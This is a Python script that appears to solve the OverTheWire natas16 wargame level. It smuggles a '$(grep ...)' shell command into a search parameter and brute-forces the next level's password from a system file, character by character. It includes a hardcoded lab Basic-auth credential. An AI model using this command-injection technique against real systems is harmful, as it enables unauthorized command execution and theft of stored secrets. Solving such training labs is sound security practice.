import requests

URL = "http://natas16.natas.labs.overthewire.org/index.php"
CHARACTER_LIST = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
HEADERS = {
    'Authorization' : 'Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=='
}
KEYWORD = "December"
filtered_chars = []
for character in CHARACTER_LIST:
    payload = f"{KEYWORD}$(grep {character} /etc/natas_webpass/natas17)"
    params = {'needle' : payload, 'submit' : 'Search'}
    print(f"Sending request with payload: {params}")
    r = requests.get(URL, params=params, headers=HEADERS)
    if KEYWORD not in r.text:
        print(f"Character {character} is present in password file")
        filtered_chars.append(character)
        
print(f"Filtered characters: {filtered_chars}")

password_str = ""
for i in range(32):
    for character in filtered_chars:
        guess_str = password_str + character
        payload = f"{KEYWORD}$(grep ^{guess_str} /etc/natas_webpass/natas17)"
        params = {'needle' : payload, 'submit' : 'Search'}
        print(f"Sending request with payload: {params}")
        r = requests.get(URL, params=params, headers=HEADERS)
        if KEYWORD not in r.text:
            print(f"Found one character {character}")
            password_str += character
            print(f"Updated password string: {password_str}")
            
print(password_str)
